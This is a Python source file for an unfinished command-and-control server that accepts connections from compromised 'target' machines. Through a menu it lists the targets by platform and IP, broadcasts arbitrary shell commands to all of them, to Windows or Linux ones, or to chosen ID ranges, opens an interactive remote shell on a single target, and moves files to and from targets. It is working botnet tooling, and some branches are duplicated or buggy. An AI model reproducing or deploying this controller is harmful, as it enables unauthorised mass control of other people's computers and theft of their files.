import os
import sys
import time
import socket
import threading
import urllib.request
from queue import Queue


# UNFINISHED


queue = Queue()
number_of_threads = 3
job_number = [1, 2, 3]
connections = []
addresses = []


def create_socket():
    global host
    global port
    global server
    try:
        host = ""
        port = 50000
        server = socket.socket()
    except socket.error as e:
        print("Socket creation error.." + "\n" + str(e))


def bind_socket():
    global host
    global port
    global server
    try:
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((host, port))
        server.listen(5000)
    except socket.error as e:
        print("Socket binding error.." + "\n" + str(e))


def accept_connections():
    global host
    global port
    global server
    global conn
    for i in connections:
        i.close()
        del connections[:]
        del addresses[:]
    while True:
        try:
            conn, addr = server.accept()
            server.setblocking(1)
            connections.append(conn)
            addresses.append(addr)
        except:
            print("Unable to accept connections!!")
            break


def Main_server():
    global host
    global port
    global server
    global conn
    print("If you're ever not sure what to do just type (help)\n")
    print("Listening for connections on port %s..." % port + "\n")
    print("Type (help) to list the server commands and their functions")
    while True:
        command = input("Main_server: ")
        if command == "help":
            print("Type:\n"
                  "     count                  to count the number of machines connected to the server\n"
                  "     clear                  to clear the screen\n"
                  "     MASS                   to send commands to multiple machines(of your choosing) simultaneously (will not show/receive target response)\n"
                  "     list                   to list all the machines connected to the server\n"
                  "     select [target_id]     to select a machine (by id) from the list of machines; example (select 10)")
        elif command == "count":
            client_counter()
        elif command == "clear":
            clear_screen()
        elif command == "MASS":
            while True:
                Type_selection = input("Select type: ")
                if Type_selection == "help":
                    print("Type:\n"
                          "     help              to see this help list\n"
                          "     goback            to go back to the main server\n"
                          "     all               to send commands to ALL the machines connected to the server\n"
                          "     windows           to send commands to all WINDOWS machines connected to the server\n"
                          "     linux             to send commands to all LINUX machines connected to the server\n"
                          "     by id             to specify multiple machines (by their ids) to send commands to, type (help) when you get there\n"
                          "     id ranged         to send commands to multiple machines in a given ID range, type (help) when you get there\n"
                          "     number ranged     to send commands to a number of RANDOM machines (starting from the first machine on the list), type (help) when you get there")
                elif Type_selection == "goback":
                    break
                elif Type_selection == "all":
                    send_to_all()
                elif Type_selection == "windows":
                    send_to_all_windows()
                elif Type_selection == "linux":
                    send_to_all_linux()
                elif Type_selection == "by id":
                    send_to_the_targets_with_the_given_ids()
                elif Type_selection == "id ranged":
                    id_ranged_command()
                elif Type_selection == "number ranged":
                    number_ranged_command()
                else:
                    print("Invalid selection!!")
        elif command == "list":
            list_connections()
        elif "select" in command:
            select_target(command[7:])
        else:
            print("Command not found!!")


def clear_screen():
    for i in range(1, 51):
        print("\n")


def send_to_all():
    global host
    global port
    global server
    global conn
    while True:
        command = input(">>>Enter_command: ")
        shell = command.encode("utf8")
        if command == "help":
            print("Type:\n"
                  "     help       to see this help list\n"
                  "     goback     to go back and select a new target platform\n"
                  "     or type the command you want to send...")
        elif command == "goback":
            break
        else:
            for i, conn in enumerate(connections):
                try:
                    MASS = "MASS "
                    conn.sendall(MASS.encode("utf8") + shell)
                except:
                    del connections[i]
                    del addresses[i]
                    continue


def send_to_all_windows():
    global host
    global port
    global server
    global conn
    while True:
        command = input(">>>Enter_command: ")
        shell = command.encode("utf8")
        if command == "help":
            print("Type:\n"
                  "     help       to see this help list\n"
                  "     goback     to go back and select a new target platform\n"
                  "     or type the command you want to send...")
        elif command == "goback":
            break
        else:
            for i, conn in enumerate(connections):
                try:
                    conn.sendall(str.encode("PLATFORM"))
                    R = conn.recv(20000)
                    P = R.decode("utf8")
                    if "win" in P:
                        MASS = "MASS "
                        conn.sendall(MASS.encode("utf8") + shell)
                    else:
                        continue
                except:
                    del connections[i]
                    del addresses[i]
                    continue


def send_to_all_linux():
    global host
    global port
    global server
    global conn
    while True:
        command = input(">>>Enter_command: ")
        shell = command.encode("utf8")
        if command == "help":
            print("Type:\n"
                  "     help       to see this help list\n"
                  "     goback     to go back and select a new target platform\n"
                  "     or type the command you want to send...")
        elif command == "goback":
            break
        else:
            for i, conn in enumerate(connections):
                try:
                    conn.sendall(str.encode("PLATFORM"))
                    R = conn.recv(20000)
                    P = R.decode("utf8")
                    if "linux" in P:
                        MASS = "MASS "
                        conn.sendall(MASS.encode("utf8") + shell)
                    else:
                        continue
                except:
                    del connections[i]
                    del addresses[i]
                    continue


def send_to_the_targets_with_the_given_ids():
    while True:
        Selected_ids = input("Select_targets_ids: ")
        ID_list = []
        if Selected_ids == "help":
            print("Type:\n"
                  "     help                     to see this help list\n"
                  "     goback                   to go back and select a new type of targets\n"
                  "     ids, example; 6,2,12     to send commands to the machines with the ids 6 and 2 and 12")
            continue
        elif Selected_ids == "goback":
            break
        else:
            try:
                for i in Selected_ids.split(","):
                    Selected_ids = Selected_ids.replace(" ", "")
                    ID_list.append(int(i))
            except:
                print("Target ids must be integers!!")
                continue
        while True:
            command = input(">>>Enter_command: ")
            shell = command.encode("utf8")
            if command == "help":
                print("Type:\n"
                      "     help       to see this help list\n"
                      "     goback     to go back and select new target ids\n"
                      "     or type the command you want to send...")
            elif command == "goback":
                break
            else:
                for i, conn in enumerate(connections):
                    if i in ID_list:
                        try:
                            MASS = "MASS "
                            conn.sendall(MASS.encode("utf8") + shell)
                        except:
                            print("Target " + connections[i] + " seems to have disconnected!!")
                            continue


def id_ranged_command():
    while True:
        Selected_range = input("Select_id_range: ")
        Selected_range = Selected_range.replace(" ", "")
        range_list = []
        if Selected_range == "help":
            print("Type:\n"
                  "     help                         to see this help list\n"
                  "     goback                       to go back and change targets id_range\n"
                  "     id range, example; 10-25     to send commands to machines with the id 10 or higher and/or machines with the id 25 or lower")
            continue
        elif Selected_range == "goback":
            break
        else:
            try:
                for i in Selected_range.split("-"):
                    range_list.append(int(i))
            except:
                print("Id range must contain only integers separated by a hyphen!!")
                continue
            while True:
                command = input(">>>Enter_command: ")
                shell = command.encode("utf8")
                if command == "help":
                    print("Type:\n"
                          "     help       to see this help list\n"
                          "     goback     to go back and select a new range of targets\n"
                          "     or type the command you want to send...")
                    continue
                elif command == "goback":
                    break
                else:
                    while True:
                        platform = input("Select_platform: ")
                        if platform == "help":
                            print("Type:\n"
                                  "     help       to see this help list\n"
                                  "     goback     to go back and change the command you want to send\n"
                                  "     A          to send the command to ALL the machines in the given id_range\n"
                                  "     W          to send the command to all WINDOWS machines in the given id_range\n"
                                  "     L          to send the command to all LINUX machines in the gives id_range")
                            continue
                        elif platform == "goback":
                            break
                        elif platform == "A":
                            for i, conn in enumerate(connections):
                                if i >= range_list[0] and i <= range_list[1]:
                                    try:
                                        MASS = "MASS "
                                        conn.sendall(MASS.encode("utf8") + shell)
                                    except:
                                        print("Target " + connections[i] + " seems to have disconnected!!")
                                        continue
                        elif platform == "W":
                            for i, conn in enumerate(connections):
                                if i >= range_list[0] and i <= range_list[1]:
                                    try:
                                        conn.sendall(str.encode("PLATFORM"))
                                        R = conn.recv(20000)
                                        P = R.decode("utf8")
                                        if "win" in P:
                                            MASS = "MASS "
                                            conn.sendall(MASS.encode("utf8") + shell)
                                        else:
                                            continue
                                    except:
                                        print("Target " + connections[i] + " seems to have disconnected!!")
                                        continue
                        elif platform == "L":
                            for i, conn in enumerate(connections):
                                if i >= range_list[0] and i <= range_list[1]:
                                    try:
                                        conn.sendall(str.encode("PLATFORM"))
                                        R = conn.recv(20000)
                                        P = R.decode("utf8")
                                        if "linux" in P:
                                            MASS = "MASS "
                                            conn.sendall(MASS.encode("utf8") + shell)
                                        else:
                                            continue
                                    except:
                                        print("Target " + connections[i] + " seems to have disconnected!!")
                                        continue
                        else:
                            print("Invalid selection!!")
                            continue
                        break


def number_ranged_command():
    while True:
        platform = input("Select_platform: ")
        if platform == "help":
            print("Type:\n"
                  "     help       to see this help list\n"
                  "     goback     to go back and select a new type of targets\n"
                  "     A          to send the command to machines of ANY platform until it has sent to as many machines as you specified\n"
                  "     W          to send the command to WINDOWS machines only until it has sent to as many machines as you specified\n"
                  "     L          to send the command to LINUX machines only until it has sent to as many machines as you specified")
        elif platform == "goback":
            break
        elif platform == "A":
            while True:
                number_of_machines = input("How_many_machines_would_you_like_to_send_commands_to?: ")
                number_of_machines = number_of_machines.replace(" ", "")
                if number_of_machines == "help":
                    print("Type:\n"
                          "     help       to see this help list\n"
                          "     goback     to go back and select a new target platform\n"
                          "     or enter the number of machines you would like to send commands to...")
                elif number_of_machines == "goback":
                    break
                else:
                    try:
                        N = int(number_of_machines)
                    except:
                        print("Number of machines must be integer, please try again!!")
                        continue
                    while True:
                        command = input(">>>Enter_command: ")
                        shell = command.encode("utf8")
                        if command == "help":
                            print("Type:\n"
                                  "     help       to see this help list\n"
                                  "     goback     to go back and change the number of machines you selected\n"
                                  "     or type the command you want to send...")
                        elif command == "goback":
                            break
                        else:
                            Counter = 0
                            for i, conn in enumerate(connections):
                                if Counter == N:
                                    break
                                else:
                                    try:
                                        MASS = "MASS "
                                        conn.sendall(MASS.encode("utf8") + shell)
                                        Counter += 1
                                    except:
                                        del connections[i]
                                        del addresses[i]
                                        continue
        elif platform == "W":
            while True:
                number_of_machines = input("How_many_machines_would_you_like_to_send_commands_to?: ")
                number_of_machines = number_of_machines.replace(" ", "")
                if number_of_machines == "help":
                    print("Type:\n"
                          "     help       to see this help list\n"
                          "     goback     to go back and select a new target platform\n"
                          "     or enter the number of machines you would like to send commands to...")
                elif number_of_machines == "goback":
                    break
                else:
                    try:
                        N = int(number_of_machines)
                    except:
                        print("Number of machines must be integer, please try again!!")
                        continue
                    while True:
                        command = input(">>>Enter_command: ")
                        shell = command.encode("utf8")
                        if command == "help":
                            print("Type:\n"
                                  "     help       to see this help list\n"
                                  "     goback     to go back and change the number of machines you selected\n"
                                  "     or type the command you want to send...")
                        elif command == "goback":
                            break
                        else:
                            Counter = 0
                            for i, conn in enumerate(connections):
                                if Counter == N:
                                    break
                                else:
                                    try:
                                        conn.sendall(str.encode("PLATFORM"))
                                        R = conn.recv(20000)
                                        P = R.decode("utf8")
                                        if "win" in P:
                                            MASS = "MASS "
                                            conn.sendall(MASS.encode("utf8") + shell)
                                            Counter += 1
                                        else:
                                            continue
                                    except:
                                        del connections[i]
                                        del addresses[i]
                                        continue
        elif platform == "W":
            while True:
                number_of_machines = input("How_many_machines_would_you_like_to_send_commands_to?: ")
                number_of_machines = number_of_machines.replace(" ", "")
                if number_of_machines == "help":
                    print("Type:\n"
                          "     help       to see this help list\n"
                          "     goback     to go back and select a new target platform\n"
                          "     or enter the number of machines you would like to send commands to...")
                elif number_of_machines == "goback":
                    break
                else:
                    try:
                        N = int(number_of_machines)
                    except:
                        print("Number of machines must be integer, please try again!!")
                        continue
                    while True:
                        command = input(">>>Enter_command: ")
                        shell = command.encode("utf8")
                        if command == "help":
                            print("Type:\n"
                                  "     help       to see this help list\n"
                                  "     goback     to go back and change the number of machines you selected\n"
                                  "     or type the command you want to send...")
                        elif command == "goback":
                            break
                        else:
                            Counter = 0
                            for i, conn in enumerate(connections):
                                if Counter == N:
                                    break
                                else:
                                    try:
                                        conn.sendall(str.encode("PLATFORM"))
                                        R = conn.recv(20000)
                                        P = R.decode("utf8")
                                        if "win" in P:
                                            MASS = "MASS "
                                            conn.sendall(MASS.encode("utf8") + shell)
                                            Counter += 1
                                        else:
                                            continue
                                    except:
                                        del connections[i]
                                        del addresses[i]
                                        continue
        else:
            print("Invalid selection!!")


def select_target(Target_id):
    global host
    global port
    global server
    global conn
    try:
        id = int(Target_id)
        if len(connections) <= 0:
            print("Error: No targets found in targets list!!")
        else:
            conn = connections[id]
            conn.settimeout(5)
            try:
                connection_check = "you there?"
                conn.sendall(connection_check.encode("utf8"))
                byte_response = conn.recv(4096)
                response = byte_response.decode("utf8")
                if response == "yep":
                    print("Connected to " + addresses[id][0] + "\n")
                    print(">>>" + addresses[id][0] + ": ", end="")
                    while True:
                        try:
                            command = input()
                            shell = command.encode("utf8")
                            if len(command) <= 0:
                                get_cwd()
                            elif command == "clear":
                                for i in range(50):
                                    print("\n")
                                conn.sendall(shell)
                                handle_response()
                            elif command == "quit":
                                break
                            elif command[:6] == "upload":
                                exists = os.path.isfile(command[7:])
                                if exists == True:
                                    try:
                                        file_size_in_bytes = os.path.getsize(command[7:])
                                        readable_file_size = str(file_size_converter(file_size_in_bytes))
                                        conn.sendall(shell)
                                        status = upload_file(command[7:], readable_file_size)
                                        if status == "Failure":
                                            break
                                    except:
                                        print("Error: Target may have disconnected!!")
                                else:
                                    print("No such file or directory!!")
                                    get_cwd()









                            elif command[:8] == "download":
                                try:
                                    conn.sendall(shell)
                                    data = conn.recv(4096)
                                    response = data.decode("utf8")
                                    if "No such file or directory" in response:
                                        print(response, end="")
                                    else:
                                        readable_file_size = str(file_size_converter(int(response)))
                                        status = download_file(command[9:], readable_file_size)
                                        if status == "Failure":
                                            break
                                        else:
                                            continue
                                except:
                                    print("Error: Target is not responding!!")















                            else:
                                conn.sendall(shell)
                                handle_response()
                        except:
                            print("Target is not responding!!")
                            break
                else:
                    print("Target seems to have disconnected!!")
            except:
                print("Target is not responding!!")
    except:
        print("Target id must be integer!!")


def upload_file(file_name, file_size):
    global host
    global port
    global server
    global conn
    printed_list = []
    try:
        data = conn.recv(4096)
        signal = data.decode("utf8")
        if signal == "START":
            print("\nProcessing file...\n"
                    "Note: this may take sometime depending on the file size and your machines speed")
            file_size_to_send = 0
            start_time = time.time()
            with open(file_name, "rb") as f:
                for i in f:
                    file_size_to_send += len(i)
            conn.sendall(file_size_to_send.to_bytes(4096, "big"))
            print("Uploading [~{ " + file_name + " : " + file_size + " }~], "
                    "this may take sometime.. please wait until file upload is finished ...")
            uploaded_so_far = 0
            with open(file_name, "rb") as f:
                for i in f:
                    conn.sendall(i)
                    uploaded_so_far += len(i)
                    if int(uploaded_so_far) > 0:
                        percentage = float(uploaded_so_far / file_size_to_send)
                        print_control = percentage_calculator(percentage)
                        if print_control != None and print_control not in printed_list:
                            print(percentage_calculator(percentage))
                            printed_list.append(str(print_control))
            was_file_received = conn.recv(4096)
            answer = was_file_received.decode("utf8")
            if answer == "Full_file_received":
                print("File uploaded successfully")
                finish_time = time.time() - start_time
                print("Upload time: " + time_calc(finish_time))
                get_cwd()
            else:
                print("Error: Failed to upload full file!!")
                get_cwd()
        else:
            print("Error: Target is not responding!!")
            get_cwd()
    except:
        print("Error: Something went wrong!!")
        return "Failure"

def get_cwd():
    global host
    global port
    global server
    global conn
    msg = "empty"
    conn.sendall(msg.encode("utf8"))
    handle_response()














def download_file(file_name, file_size):
    global host
    global port
    global server
    global conn
    printed_list = []
    conn.sendall(str.encode("START"))
    try:
        print("\nWaiting for target machine to process file...\n"
              "Note: this may take sometime depending on the file size and target machine speed")
        start_time = time.time()
        remaining = int.from_bytes(conn.recv(4096), "big")
        print("Downloading: [~{ " + file_name + " : " + file_size + " }~], "
                "please wait until download is finished ...")
        requested_file_size_in_bytes = remaining
        with open(file_name, "wb") as f:
            while remaining:
                data = conn.recv(min(remaining, 4096))
                remaining -= len(data)
                f.write(data)
                downloaded_so_far = int(os.path.getsize(file_name))
                if int(downloaded_so_far) > 0:
                    percentage = float(downloaded_so_far / requested_file_size_in_bytes)
                    print_control = percentage_calculator(percentage)
                    if print_control != None and print_control not in printed_list:
                        print(percentage_calculator(percentage))
                        printed_list.append(str(print_control))
        downloaded_file_size_in_bytes = os.path.getsize(file_name)
        if downloaded_file_size_in_bytes == requested_file_size_in_bytes:
            print("File downloaded successfully")
            finish_time = time.time() - start_time
            print("Download time: " + time_calc(finish_time))
            get_cwd()
        else:
            print("Error: Failed to download full file!!")
            get_cwd()
    except:
        print("Error: File download failed!!")
        return "Failure"


def file_size_converter(bytes):
    suffixes = ['B', 'KB', 'MB', 'GB', 'TB', 'PB']
    if bytes == 0:
        return '0 B'
    else:
        i = 0
        while bytes >= 1000 and i < len(suffixes)-1:
            bytes /= 1000
            i += 1
        f = ('%.2f' % bytes).rstrip('0').rstrip('.')
        return '%s %s' % (f, suffixes[i])


def percentage_calculator(percentage):
    hashtag = "#"
    if (percentage * 100) >= 90 and (percentage * 100) <= 95:
        return "90% finished " + hashtag * 9
    elif (percentage * 100) >= 80 and (percentage * 100) <= 85:
        return "80% finished " + hashtag * 8
    elif (percentage * 100) >= 70 and (percentage * 100) <= 75:
        return "70% finished " + hashtag * 7
    elif (percentage * 100) >= 60 and (percentage * 100) <= 65:
        return "60% finished " + hashtag * 6
    elif (percentage * 100) >= 50 and (percentage * 100) <= 55:
        return "50% finished " + hashtag * 5
    elif (percentage * 100) >= 40 and (percentage * 100) <= 45:
        return "40% finished " + hashtag * 4
    elif (percentage * 100) >= 30 and (percentage * 100) <= 35:
        return "30% finished " + hashtag * 3
    elif (percentage * 100) >= 20 and (percentage * 100) <= 25:
        return "20% finished " + hashtag * 2
    elif (percentage * 100) >= 10 and (percentage * 100) <= 15:
        return "10% finished " + hashtag * 1
    else:
        return None


def time_calc(seconds):
	if seconds >= 60:
		minutes = int(seconds / 60)
		if minutes >= 60:
			hours = int(minutes / 60)
			return f"{hours:02}:{minutes % 60:02}:{seconds % 60:02} Hour(s)"
		else:
			return f"{minutes:02}:{seconds % 60:02} Minute(s)"
	else:
		return f"{seconds:02} Second(s)"


def list_connections():
    hyphen = "-"
    space = 20
    active_connections = ""
    for i, conn in enumerate(connections):
        try:
            conn.sendall(str.encode("PLATFORM"))
            R = conn.recv(20000)
            P = R.decode("utf8")
            if len(P) > 0:
                if "win" in P:
                    P = "win"
                elif "linux" in P:
                    P = "linux"
                else:
                    P = "Unknown!!"
                active_connections += "  " + str(i) + " " * (space - len(str(i))) + str(P) + " " * (space - len(str(P)))\
                + str(addresses[i][0]) + " " * (space - len(str(addresses[i][0]))) + str(addresses[i][1]) + "\n"
            else:
                continue
        except:
            del connections[i]
            del addresses[i]
            continue
    print(" " + hyphen * 28 + " " + "Targets" + " " + hyphen * 29)
    print("| " + "ID" + " " * (space - len("ID")) + "PLATFORM" +
    " " * (space - len("PLATFORM")) + "IP" + " " * (space - len("IP")) + "PORT" + " |")
    print(" " + hyphen * 66)
    print(active_connections)


def handle_response():
    global host
    global port
    global server
    global conn
    data = conn.recv(4096)
    response = data.decode("utf8")
    print(response, end="")


def client_counter():
    global host
    global port
    global server
    global conn
    counter = 0
    while True:
        C = input("What_would_you_like_to_count?: ")
        if C == "help":
            print("Type:\n"
                  "     help       to see this help list\n"
                  "     goback     to go back to the main server\n"
                  "     A          to count the number of ALL the machines connected to the server\n"
                  "     W          to count the number of all WINDOWS machines connected to the server\n"
                  "     L          to count the number of all LINUX machines connected to the server")
        elif C == "goback":
            break
        elif C == "A":
            for i in connections:
                counter += 1
            print(counter)
            counter = 0
        elif C == "W":
            for i, conn in enumerate(connections):
                try:
                    conn.sendall(str.encode("PLATFORM"))
                    R = conn.recv(20000)
                    P = R.decode("utf8")
                    if "win" in P:
                        counter += 1
                    else:
                        continue
                except:
                    del connections[i]
                    del addresses[i]
                    continue
            print(counter)
            counter = 0
        elif C == "L":
            for i, conn in enumerate(connections):
                try:
                    conn.sendall(str.encode("PLATFORM"))
                    R = conn.recv(20000)
                    P = R.decode("utf8")
                    if "linux" in P:
                        counter += 1
                    else:
                        continue
                except:
                    del connections[i]
                    del addresses[i]
                    continue
            print(counter)
            counter = 0
        else:
            print("Invalid selection!!")



def check_my_internet_connection():
    try:
        urllib.request.urlopen("http://google.com")
    except:
        print("\nError: Please check your internet connection ...\n")


def create_workers():
    for _ in range(number_of_threads):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()


def create_jobs():
    for x in job_number:
        queue.put(x)
    queue.join()


def work():
    x = queue.get()
    if x == 1:
        create_socket()
        bind_socket()
        accept_connections()
    elif x == 2:
        Main_server()
    elif x == 3:
        check_my_internet_connection()
    queue.task_done()


create_workers()
create_jobs()




